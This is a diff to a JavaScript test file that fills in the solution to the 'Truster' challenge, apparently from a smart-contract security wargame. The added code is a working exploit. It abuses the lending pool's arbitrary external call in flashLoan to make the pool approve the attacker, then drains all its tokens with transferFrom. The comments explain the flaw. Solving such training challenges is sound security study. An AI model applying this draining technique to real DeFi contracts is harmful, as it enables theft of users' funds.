@@ -28,7 +28,17 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
+        //we need to transfer tokens from the pool to the attacker contract. Our lenderPool contract
+        //contains an externall call (by specifying a contract address and msg.data: func selector and arguments) 
+        //to another arbitrary contract inside its flashloan function. In this call, the pool contract itself 
+        //will be the msg.sender. 
+        //We can exploit this fault and make the pool approve the attacker to be able to spend its 
+        //tokens on behalf, and drain the pool afterwards.  
+        const iface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"])
+        const calldata = iface.encodeFunctionData("approve",[attacker.address, TOKENS_IN_POOL ])
+        await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, calldata)
+        await this.token.connect(attacker).transferFrom( this.pool.address ,attacker.address, TOKENS_IN_POOL)
+
     });
 
     after(async function () {
